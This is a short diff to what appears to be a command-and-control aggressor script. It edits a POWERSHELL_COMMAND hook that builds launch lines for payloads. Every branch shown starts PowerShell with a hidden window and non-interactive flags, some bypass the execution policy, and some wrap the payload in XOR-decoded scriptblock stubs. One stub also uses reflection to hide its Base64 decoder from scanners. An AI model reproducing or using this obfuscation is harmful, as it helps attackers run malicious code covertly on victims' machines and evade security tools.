@@ -149,10 +149,10 @@ set POWERSHELL_COMMAND {
     }
     else if ($strategy == 1) {
         if ($2) {
-            $cmd = "powershell -nop -noni -w h -c \" $+ $1 $+ \"";
+            $cmd = "powershell -nop -noni -w hidden -c \" $+ $1 $+ \"";
         }
         else {
-            $cmd = "powershell -nop -noni -ep bypass -w h -c \" $+ $1 $+ \"";
+            $cmd = "powershell -nop -noni -ep bypass -w hidden -c \" $+ $1 $+ \"";
         }
     }
     else if($strategy == 2) {
@@ -161,10 +161,10 @@ set POWERSHELL_COMMAND {
         $stub = "&([scriptblock]::Create((( $+ $enc $+ )|%{\$_-bxor $+ $key $+ }|%{[char]\$_})-join''))";
         
         if ($2) {
-            $cmd = "powershell -nop -noni -w h -c \" $+ $stub $+ \"";
+            $cmd = "powershell -nop -noni -w hidden -c \" $+ $stub $+ \"";
         }
         else {
-            $cmd = "powershell -nop -noni -ep bypass -w h -c \" $+ $stub $+ \"";
+            $cmd = "powershell -nop -noni -ep bypass -w hidden -c \" $+ $stub $+ \"";
         }
     }
     else if ($strategy == 3) {
@@ -174,10 +174,10 @@ set POWERSHELL_COMMAND {
         $stub = "\$t=([type]'Convert');&([scriptblock]::Create((\$t::((\$t.GetMethods()|?{\$_.Name-clike'F*g'}).Name)(' $+ $enc $+ ')|%{\$_-bxor $+ $key $+ }|%{[char]\$_})-join''))";
 
         if ($2) {
-            $cmd = "powershell -nop -noni -w h -c \" $+ $stub $+ \"";
+            $cmd = "powershell -nop -noni -w hidden -c \" $+ $stub $+ \"";
         }
         else {
-            $cmd = "powershell -nop -noni -ep bypass -w h -c \" $+ $stub $+ \"";
+            $cmd = "powershell -nop -noni -ep bypass -w hidden -c \" $+ $stub $+ \"";
         }
     }
 
